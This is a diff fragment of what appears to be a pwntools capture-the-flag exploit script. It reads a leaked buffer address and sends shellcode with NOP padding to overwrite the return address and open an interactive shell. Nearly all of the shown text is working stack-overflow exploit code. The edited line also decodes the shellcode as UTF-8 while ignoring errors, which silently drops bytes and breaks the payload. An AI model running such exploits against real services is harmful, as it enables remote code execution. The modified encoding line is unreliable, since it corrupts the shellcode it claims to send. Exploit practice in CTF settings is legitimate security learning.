@@ -12,7 +12,7 @@ text = io.recvline()[14: -2] # b"What's this:0xfff06990?\n" 14:-2是 fff06990
 #print text[14:-2]
 buf_addr = int(text, 16)
 
-payload = shellcode.decode('latin') + '\x90' * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr).decode('latin')
+payload = shellcode.decode('utf-8', 'ignore') + '\x90' * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr).decode('latin')
 io.send(payload)
 io.interactive()
 io.close()
